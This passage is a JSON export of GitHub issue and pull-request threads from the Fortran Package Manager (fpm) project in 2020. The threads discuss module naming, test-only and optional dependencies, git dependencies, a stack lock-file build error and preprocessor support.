                    "text": "If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules.\n\nI hadn't realised this convention was for avoiding name clashes but I guess that makes sense - how would name clashes be avoided without this requirement @everythingfunctional ?\n\nSubmodules are a bit convoluted.\n\nI remember reading somewhere that submodule file naming conventions vary between compiler vendors - can these dependencies not be tracked without relying on .mod and .smod files?\nWithin my makefiles I never reference *mod files and simply rely on the corresponding object file for updating dependencies; in this way submodule dependencies can be treated like a normal use dependency where the submodule 'uses' its parent module."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:10:34+00:00",
                    "text": "I'd still recommend people follow that naming convention, it just won't be a hard requirement. So you can still have a module named utilities_stats in a file src/utilities/stats.f90 per the current requirement and it will still work just fine. With the change, the module could just be named stats, but if any other package has a module named stats, they'll conflict of course. The possibility of conflict already exists, and I think always will unless we make a breaking change and require all modules in a library be prefixed with the name of the library.\nI don't recall exactly where I read that naming convention. It may have just been the gfortran documentation, in which case this may be a bit trickier when we try and support multiple compilers, but hopefully not a big deal.\nWhile you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files. And it sidesteps a potential optimization I wish the compilers would actually implement; don't update the .mod file if none of the interfaces changed. That would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 17:42:38+00:00",
                    "text": "I think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\nThis restriction is there to prevent name collisions. What we can do is remove the restrictions if the user requests that in fpm.toml --- with the understanding that fpm cannot guarantee there won't be name collisions with user code any more; this option would be used to get existing packages working quickly, but they will not be \"conforming\", and thus there can be collisions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:59:08+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions. If you put a module named utils in the root src folder, you're almost guaranteed to have a name collision with some other package and there isn't anything in place preventing that at the moment.\nThe restriction is really only preventing accidental name collisions within a library, and so far the errors have caused more confusion than they have helped anything.\nI can add a check for it back in once this is implemented, but at that point it's just enforcing a convention (albeit a good one), more than any technical requirement, and still not actually guaranteeing no name collisions between packages."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 18:18:39+00:00",
                    "text": "While you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files.\n\nGood point, but I disagree with your assertion of incorrectness; depending on module object files will not result in an incorrect dependency between source files, rather it (theoretically) results in redundant recompilation as you point out. Therefore object file dependencies are correct for modules, but not optimal.\nI am genuinely intrigued as to why your proposed optimisation is not implemented anywhere, it seems like a simple fix to a big problem!\n\nThat would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules.\n\nMy own motivation for submodules is mainly to flatten the dependency tree to just two layers so that each layer can be compiled completely in parallel. Being able to compile in parallel quickly outweighs any redundancy in my dependencie.\n\nI think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\n\nMy preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 18:27:58+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions.\n\nThat's true but this is not so much about the current guarantees, but about the design we're aiming for.\nDo we want to prevent name clashes? (I think it's unanimous yes)\nIf yes, then what is the optimal solution to do it? Prefixing with the package name is the best I can think of.\nThe only exception should be single-module libraries, which could have a module with the same name as the package.\nI think this would be good to discuss on our call on Thursday."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 18:48:11+00:00",
                    "text": "My preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?\n\nYes, I'll start a new issue."
                }
            ]
        },
        {
            "number": 85,
            "user": "everythingfunctional",
            "date": "2020-05-30 03:03:17+00:00",
            "title": "Implement test/executable specific dependencies",
            "text": "At this point it's kind of a terrible, ugly, hacked together prototype, but it works. And allows for \"semi\"-circular dependencies. If one of your test or executable dependencies depends on your library, it will still work.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 03:08:20+00:00",
                    "text": "My use case for this is that vegetables depends on both iso_varying_string and strff, but I want to be able to use vegetables to test them. This way that will work.\nI still need to try to migrate these to using fpm to be sure that it will work, but I'll try that over the next day or two. The test I added suggests it will."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:08:40+00:00",
                    "text": "Yes, we need this feature. However, let's follow the Cargo's syntax? Or do you have reasons why that's not a good idea in this case?\nhttps://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#development-dependencies\nIt has [dependencies] for just building the package, and additional [dev-dependencies] for building tests / benchmarks etc.\nCurrently you have:\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\n  [test.dependencies]\n    circular_test = { path = \"../circular_test\" }\nLet's instead do:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\n\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\nAnd finally fpm should be clever enough to figure out the tests from the layout only (eventually), so it would become just:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\nIn Cargo you can specify also dependencies for a particular target only. But it seems this dev-dependencies would cover 90% of use cases, including yours (I think)."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:09:43+00:00",
                    "text": "My other comment is that instead of adding tests in the root directory as examples, let's move them in the tests directory?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:41:26+00:00",
                    "text": "I'm not opposed to also having [dev-dependencies], but my question would be, are those used for the executables too? Or would we want to have [test-dependencies] and [exe-dependencies]?\nI can move the tests into the tests directory. That's no problem."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 00:16:34+00:00",
                    "text": "I was able to try this out converting a few of my libraries to using fpm, and it works great. This will make it possible for me to convert (almost) all of my packages to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 02:49:41+00:00",
                    "text": "I am not sure about the executables --- I would expect that dev-dependecies only work for tests, benchmarks etc.\nIn your use case, you have to have special dependencies for executables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 23:20:53+00:00",
                    "text": "I don't personally have a project with special dependencies for an executable, but I could envision one. Somebody develops and tool, and there's a library that goes along with it, but the executable has dependencies that user's of the library don't necessarily need. The use case is probably rare enough, and covered by the executable/test specific dependencies I've already implemented that having dev-dependencies only for tests is probably fine. I'll get that implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 23:35:10+00:00",
                    "text": "Yes, I think that's precisely the approach that Cargo took also. For this rare case, you just specify the dependency for the executable that needs it. Otherwise the dependencies and dev-dependencies cover over 90% of use cases.\n\nThanks for all the work you are doing on this.\n\u2026\nOn Sun, May 31, 2020, at 5:21 PM, Brad Richardson wrote:\n\n\n I don't personally have a project with special dependencies for an\n executable, but I could envision one. Somebody develops and tool, and\n there's a library that goes along with it, but the executable has\n dependencies that user's of the library don't necessarily need. The use\n case is probably rare enough, and covered by the executable/test\n specific dependencies I've already implemented that having\n `dev-dependencies` only for tests is probably fine. I'll get that\n implemented.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#85 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCG44ZNP5I7MSX2U3LRULQ6BANCNFSM4NOQBL6A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 16:32:06+00:00",
                    "text": "Sorry, I don't have time to review this but please go forward with it and I will play with it at a later time."
                }
            ]
        },
        {
            "number": 84,
            "user": "certik",
            "date": "2020-05-29 18:14:25+00:00",
            "title": "Optional dependencies",
            "text": "It is extremely common to have optional dependencies in Fortran projects (see the examples section at the end of this description).\nThe way Cargo handles it is described in here: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html\n[dependencies]\nfoo = { version = \"1.0\", optional = true }\nbar = { version = \"1.0\", optional = true }\n\n[features]\nfancy-feature = [\"foo\", \"bar\"]\nit seems it is somehow tied to \"features\" that one can enable somehow, but I don't yet understand the full mechanism. Also there must be some way to propagate this \"feature\" on/off status inside the code using some macros or something.\nIn Fortran, I can see at least two ways to implemented it, are there more?\n\n\nWe can define some pre-processor definitions and use #ifdef to enable certain code if an optional dependency is used. We can support multiple pre-processors (cpp, fypp, ...).\n\n\nOne can do it at the module level: I sometimes have two files, say, openmp.f90 and openmp.dum.f90 both of which implement the openmp module, so the rest of the Fortran code just use openmp no matter what, and only one of the two files is compiled and linked in the buildsystem:\n# OPENMP\nif(WITH_OPENMP)\n    set(SRC ${SRC}\n        openmp.f90\n    )\nelse()\n    set(SRC ${SRC}\n        openmp.dum.f90\n    )\nendif()\n\n\nThe advantage of 2. is that you do not have to use any pre-processor, which I try to avoid in my codes. The advantage of 1. is that it's simpler in some ways, you just put a few ifdefs in your code.\nI think fpm can support either one, or both.\nfpm could for example create some module, say optional_dependencies and export some variable or a function such as openmp_enabled for the \"openmp\" feature, that you can call in your code and make some decisions.\nEither way, we should figure out how to make fpm support optional dependencies and features that the user can configure.\nExamples\nExample 1\nA typical example is a large electronic structure code, that provides its own default exchange correlation functional, but optionally allows to link against the libxc library, in which case one must enable and link against it and some code paths are different (typically some Fortran modules are enabled / disabled) and it allows the code to use functionals from the libxc library.\nExample 2\nThere are many linear and eigensolver libraries, and there is typically some default, but if the user installs a particular 3rd party solver, it can optionally enable it in the Fortran program to use it instead.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-29 19:36:50+00:00",
                    "text": "I would lean towards option 1 as being easier to implement in fpm. It just doesn't fetch and build optional dependencies unless specified, and only defines the environment variables for the ones specified.\nWith option 2, the build process has to be able to make decisions about which source file gets used to satisfy a given module. This requires us to modify/extend our current naming conventions with regards to source file name and module name.\nI definitely see the need for such a feature, and I think we should definitely try and tackle this at some point."
                }
            ]
        },
        {
            "number": 83,
            "user": "certik",
            "date": "2020-05-24 00:56:44+00:00",
            "title": "Add tests",
            "text": "Currently the new fpm does not seem to have any tests. We have to fix it, and start adding lots of tests.\nIn the old fpm, I had two initial tests:\nhttps://github.com/fortran-lang/fpm/tree/master/archive/tests\nAnd we need to add a lot more. The idea would be to test any configuration that is supported, and that way we can ensure that it works and things don't break when new functionality is implemented.\nFurthermore, if we decide to use a different language for the production implementation, the tests will allow us to ensure that the new implementation works as expected.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:54:40+00:00",
                    "text": "This should be resolved with the current status of CI testing."
                }
            ]
        },
        {
            "number": 82,
            "user": "everythingfunctional",
            "date": "2020-05-23 17:35:14+00:00",
            "title": "Enable dependencies",
            "text": "This makes working with git dependencies possible!\nSee an example project I create here.\nIt's still very raw, but should work for a lot of situations.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-23 19:40:39+00:00",
                    "text": "Great, I'm excited to play with it.\n\nIt's still very raw, but should work for a lot of situations.\n\nAt this time, do you know what situations don't work?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-24 01:00:15+00:00",
                    "text": "Great work, thanks for adding this Brad!\nWe really need to start adding tests for every PR, see #83.\nFor this particular PR, what is the best way to test this? It might be quite hard to setup a test server and download using it, all automatically when running tests. The way I was thinking we can test this is to add support for specifying a dependency that lives on a local filesystem. That way we can simply test it locally, without setting up some test servers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-24 03:19:07+00:00",
                    "text": "@milancurcic , I think it may still have an issue trying to build if there is a circular dependency. You'll probably hit an infinite loop. But I haven't tested that.\n@certik , Agreed. I'm thinking of going ahead and adding path dependencies, and then yes, you can just test it locally. Really the only way to test whether stuff that needs to go over the network works is to let it go over the network. Otherwise you have to figure out how to supply a \"dummy network\" when working under tests.\nI think at this point, the best tests are going to be beta testers. I'm going to try and migrate a few of my projects to use it and see how it goes. Long term we could take the Rust/Cargo approach and just try to build all the libraries in the registry with every new version. Not sure how feasible that is, but it would at least guarantee we never break any existing packages."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-24 16:10:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 02:09:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend\n\n\nThat's odd. stack.yaml.lock is supposed to ensure that exactly the same dependency versions get used for everybody. It looks like something went funky with the specific version of tomland that I specified. What is the difference in that file after you removed it and rebuilt?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:02:06+00:00",
                    "text": "$ diff stack.yaml.lock stack.yaml.lock.orig \n8,10d7\n<     cabal-file:\n<       size: 6802\n<       sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n\nstack.yaml.lock.orig is the one checked out from the repo. stack.yaml.lock is the one generated by stack build.\nI don't understand how is this related to the specific tomland version \ud83d\ude15\nFWIW, I reproduced this on Fedora 28 and Ubuntu 18.10."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 18:44:08+00:00",
                    "text": "It looks like the difference in the files is in the tomland section, and the error message you got mentions tomland. So that's where the problem is, but I'm still not sure why. I'm on Arch running version 2.3.1 of stack. Maybe the format/info in the stack.yaml.lock versions has changed slightly?\nI can remove it for now, since things work without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:55:22+00:00",
                    "text": "Sounds good, this can be merged IMO."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:02:22+00:00",
                    "text": "Here is the error that I am getting with d89214b on Ubuntu 18.04:\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nWith 1cb711d things build fine.\nThe lock file, at least for Rust, is supposed to be checked into git for applications but not libraries. fpm would be an application."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:03:20+00:00",
                    "text": "As a side note, since fpm is following the same design as Stack and Cargo: I want fpm's error messages to be much nicer and more user friendly than the above exception that Stack gives. :)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:28:13+00:00",
                    "text": "Aren't you are supposed to recommit the lock file whenever you add/update dependencies - @everythingfunctional is the tomland dependency new in this PR?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:31:17+00:00",
                    "text": "Yes, you are supposed to regenerate it when dependencies change. The tomlang dep seems to be new here?\nhttps://github.com/fortran-lang/fpm/pull/82/files#diff-fafd0cdcd559a7b124cc61c29413fb54R42"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:34:39+00:00",
                    "text": "When I commit the new lock file that got generated for me, and diff the old one, here is what I get:\n$ git diff d89214b\ndiff --git a/stack.yaml.lock b/stack.yaml.lock\nindex 31e0c19..15bfc22 100644\n--- a/stack.yaml.lock\n+++ b/stack.yaml.lock\n@@ -5,6 +5,9 @@\n \n packages:\n - completed:\n+    cabal-file:\n+      size: 6802\n+      sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n     name: tomland\n     version: 1.3.0.0\n     git: https://github.com/kowainik/tomland.git\nFurthermore, when I remove those 3 lines by hand, I get the exception above.\nFrom this I conclude that the lock file should be committed, and it should contain the above 3 lines."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:42:19+00:00",
                    "text": "I pushed in the lock file again. Things work on my machine and tests pass at the CI.\n@everythingfunctional can you verify that things work on your machine also with the latest commit 3613167?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:51:50+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 20:07:51+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?\n\nExactly, this worries me too that our CI passed even though the lock file was broken. Possibly the CI uses a different Haskell version?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 20:56:23+00:00",
                    "text": "I suspect my machine and the CI are using a newer version of stack, which does not need those 3 lines in the stack.yaml.lock file. @certik , your latest push does work on my machine.\nYes, the .lock file should generally be checked in to version control. It's generally ignored for dependencies, (i.e. if a library has this file, when you include it as a dependency, that file doesn't even get looked at). It's purpose is to avoid having to consider different versions of dependencies when trying to diagnose \"works on my machine\" type issues. Stack is able to make sure you're using the exact same dependencies of everything your project uses, including the version of GHC (the Haskell compiler), except for the version of Stack itself. It seems to me that's the only possible explanation here.\n@LKedward , the dependency on tomland isn't new here, but I had to implement some new functionality in that library, and it hasn't made it to an official release yet, so I had to specify it as a git dependency. That part is new here."
                },
                {
                    "user": "certik",
                    "date": "2020-05-28 20:43:47+00:00",
                    "text": "Thanks for merging."
                }
            ]
        },
        {
            "number": 81,
            "user": "ShamanTcler",
            "date": "2020-05-19 12:59:23+00:00",
            "title": "Understanding intent",
            "text": "This is more of a discussion than an issue.\nAs a developer who routinely develops in FORTRAN and  C, I have come across Conan, http://conan.io a C/C++ package manager.\nNow in my mind C and FORTRAN are very similar in character ... both have attributes such as:\n\ncompilers\n\ncompiler vendors\ncompiler versions\ncompiler flags\n\n\nbitness (32 vs 64)\ndebug/release builds\n\nEtc.\nConan manages these very well via a hash assigned to the package.\nNow I tried about two years ago to implement a similar scheme, to what Conan was doing but finally said ... they just do it better.\nToday I use VS Code, CMake/Ninja and Conan as my \"best practice\". ( BTW, the new Ninja version 10.  native support for FORTRAN modules ) This set up supports Intel FORTRAN/GFORTRAN and hopefully FLANG soon\nSo I am curious what do you think you bring new to the table.\nPlease don't think I am just throwing stones ... I have hundreds of thousands of lines of FORTRAN code, and Conan is bit of a \"force fit\", but not bad,  ... so I truly am looking to improve my best practice.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 13:42:12+00:00",
                    "text": "Hi @ShamanTcler and welcome! Thank you for starting this discussion.\nHere's an excerpt from an email I sent to colleagues a few days ago. It's my answer to your question.\nfpm solves the (1) user and (2) developer experience problem. I don't think it solves any technical problem. How it's implemented under the hood is details, and there are many different roads we can take. But in the design of fpm we focus on UI and UX.\n\nUser experience: Once fpm is installed, all that the user has to do is fpm build, fpm run, fpm test, or fpm install. This is by far the simplest UI for Fortran out there, and is aligned to what Cargo does (we designed it after Cargo exactly with UX in mind). So the only friction comes down to installing fpm. If we make this seamless--single binary executable to download--then we'll have reduced the friction to near minimum.\n\nThe key solution for here is that the user doesn't have to a) download the source code by hand; b) edit any build files; and c) download and build any dependencies by hand.\n\nDeveloper experience: See this doc that describes the layout of an fpm package. As you can see, we take the sane default approach like Cargo where we assume a package layout and file and module naming conventions. So the developer has to remember/learn only where to put the files and how to name them. As far as I'm aware, this is the simplest developer UI for Fortran out there. Plus, the developer also gets the perk from the user experience above, which is that dependencies are automatically downloaded, built, and linked for you.\n\nAs you know, there are tools that collectively do all of the stuff that I described. However, there's no single tool that does all of what we want, and no more. Most tools were designed and intended as \"the one build system/package manager to rule them all\". They all fail because this is an extremely difficult problem. They also tend to be language agnostic (or at least support several different languages), so they necessarily have to be more general and handle more edge cases, which means more complex, and more complicated for the user.\nAnother great developer recently said \"we don't need another language-specific tool\". I think that's exactly what we need. Language-agnostic is what makes a tool become either too general and complex, or the design gets out of hand to reach all its objectives. Cargo is perfect for Rust. We need Cargo for Fortran.\nThere's also a cultural and aesthetic aspect that people rarely bring up. It's very difficult to convince a community of developers to adopt exclusively Conda, CMake, Meson, Ninja, or whatever. Conda is maybe becoming a household name in scientific Python community, but CMake is far from being a household name for Fortran. If there's a household name for Fortran, that would maybe be autotools + Make, and that's just Linux. Yes, I'm mixing up build systems and package managers here, but I'm trying to make a point, which is that we need a household name. We need a tool that, when a newcomer to Fortran visits fortran-lang.org, we can tell them here is the one tool you should use. This will only work if we have mass buy in from the community, and I think we can do this more easily if we build a Fortran-specific build system + package manager in a single tool, than trying to adopt multiple external tools.\nIt's easy for you and me and most people here to say \"why do you need this when there are already tools X, Y, and Z\". I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja. I've walked away before from Python packages that only had the Conda install instruction, and were not installable by pip. That's just me. Now imagine how it is for somebody new to Fortran, not to mention somebody new to programming.\nWe are targeting Fortran users across all skill levels, and especially the entry level programmers. I think it's crucial for Fortran that a new programmer who learns Fortran as their first language, loves the experience and is not scared off.\nThe Fortran build system + package manager must be at least as easy (and should be easier) to install and use, than it is to install and use the compiler directly.\n\nTake a look at Fortran Discourse. I think it's the perfect format for discussions like this."
                },
                {
                    "user": "ShamanTcler",
                    "date": "2020-05-19 14:42:45+00:00",
                    "text": "Thanks for the link to \"FORTRAN Discourse\" ... already joined. ( user CandL there)\nI see mention of FORTRANCon  ... good 'ole Steve Lionel is the key note, should be a good show.\nYour comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja. I am sure this could lead to an interesting evening over a few adult beverages of your choice.\nBut I agree the discourse area is a better spot for this discussion. Thanks for your time and consideration.\nRegards\nCarl"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 15:22:40+00:00",
                    "text": "Your comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja.\n\nYes, a bit of a hyperbole. If I need the project to get work done, sure. If I'm just playing, I'd pass. From Ninja's landing page, I'm not clear how it can help me. From the manual, it sounds like a faster Make. So, a tool for power users.\n\nI am sure this could lead to an interesting evening over a few adult beverages of your choice.\n\nI hope we get a chance to do it soon! :)"
                }
            ]
        },
        {
            "number": 80,
            "user": "milancurcic",
            "date": "2020-05-17 20:20:24+00:00",
            "title": "Install dependencies from remote git URLs",
            "text": "As discussed in #33, let's allow installing fpm-enabled packages form their git repositories.\nIf the following is placed in fpm.toml:\n[dependencies]\ndependency_name = { git = git_url, tag = git_tag }\nThen the package depends on dependency_name, which fpm will fetch from git_url and a specific git tag git_tag.\nHere's a concrete example that will work, when this issue is implemented.\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nQuestion: If tag is omitted, should fpm fetch from the latest commit on master? I think so. Cargo does it like that as well. Then you could also do:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\" }",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-17 20:23:03+00:00",
                    "text": "This is exactly my plan."
                },
                {
                    "user": "certik",
                    "date": "2020-05-17 21:05:04+00:00",
                    "text": "Yes, if tag is omitted, it should check out the latest master.\nOtherwise I agree."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 17:46:14+00:00",
                    "text": "This was finished in #85"
                }
            ]
        },
        {
            "number": 79,
            "user": "certik",
            "date": "2020-05-14 19:48:36+00:00",
            "title": "Easily create a Spack package",
            "text": "This issue is similar to #70 but for Spack instead of Conda. Essentially for people that use Spack (myself included sometimes), it would be nice to just be able to spack install any fpm package.\nTo do that, fpm should be able to take any package and produce a working Spack package out of it, that can then be submitted to Spack.\nThe generated Spack package would probably call fpm underneath to do the build.",
            "comments": []
        },
        {
            "number": 78,
            "user": "LKedward",
            "date": "2020-05-12 12:35:32+00:00",
            "title": "Preprocessor support",
            "text": "This issue is to ask whether fpm will have any built-in support for preprocessing and how this might look.\nI bring this up since I noticed that stdlib is listed in #17 under 'Pure Fortran', however it requires the fypp preprocessor to build from repo source.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-12 14:18:26+00:00",
                    "text": "We've had discussions about it. I believe we decided we want to settle on a preprocessor, and just always use it. I'd have to go find that discussion, but I believe we settled on fypp."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 14:49:08+00:00",
                    "text": "Yes, we definitely want fpm to apply a preprocessor. We also talked about file extensions, and it seems most people would prefer to just stick with .f90, and fpm would apply the preprocessor appropriately (via a compiler option or otherwise).\nWe probably should support both cpp and fypp. For fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-12 15:23:04+00:00",
                    "text": "\ud83d\udc4d on both cpp and fypp. cpp is de facto standard and many Fortran projects rely on it. fypp we have established earlier that it is more powerful than cpp and thus useful for generation of specific procedures like those in stdlib.\n\nFor fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python.\n\nI agree, although this is a non-issue until fpm itself is Fortran or C++. Python ships out of the box on most systems."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 15:33:39+00:00",
                    "text": "I agree, although this is a non-issue until fpm itself is Fortran or C++.\n\nActually it's an issue for distributing fpm, as we cannot easily integrate fypp into the fpm single binary, so we now have to ship it along side fpm somehow, etc.\nHowever, since we will eventually use Conda for the non Fortran dependencies, then fypp can just be installed using Conda / Mamba, and then indeed it should become a non-issue."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-27 23:04:02+00:00",
                    "text": "So is there any interest in a Fortran-based version of fpp? Without macro support I think it would be simple to convert\npfpp to look like fpp(1), albeit there are varients of fpp(1) to be sure. Adding macros would be considerably more effort.  Adding basic templating based on looping or cacheing and substitution would probably be easier than macros. It would not be as powerful as some but not looking to recreate m4(1). But for basic if/else/elseif/endif preprocessing it works well. Combined with fpm setting a few variables in a standard way like OSTYPE and COMPILER and COMPILER_VERSION it could ship with fpm and only require a Fortran compiler. I am thinking it would just handle user-end pre-processing, not expand the code on the backend so it would handle \"cpp\"-like functions and assume the files were already expanded via fypp or whatever before-hand so that all that remained were .F and .F90 files with #if/#else/#elif/#endif/#ifdef/#ifndef directives."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-28 01:27:54+00:00",
                    "text": "I definitely think having a Fortran based preprocessor that can be tweaked as desired is appealing. Have you compared your preprocessor to the list of behaviors compiled by the flang developers: https://github.com/llvm/llvm-project/blob/master/flang/docs/Preprocessing.md?\nIf anyone is interested I also uploaded the Sun Microsystems Fortran preprocessor to GitHub: https://github.com/ivan-pi/fdfpp\nThe original code can be found on netlib. I have made no attempts to run it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-29 02:45:48+00:00",
                    "text": "Making pfpp support macros and some of the other issues there is more effort than it is worth without stronger interest I suppose. Interesting list.  The main problem seemed to be to emulate cpp without the issues that cpp has, and then some added\na few features to fix other issues with pre-processing Fortran like resultant line length and others did not and so on. I had run across a few issues with fpp commands not being the same but did not know it varied that much. Looks like I would have hit more if I had not started using my own."
                },
                {
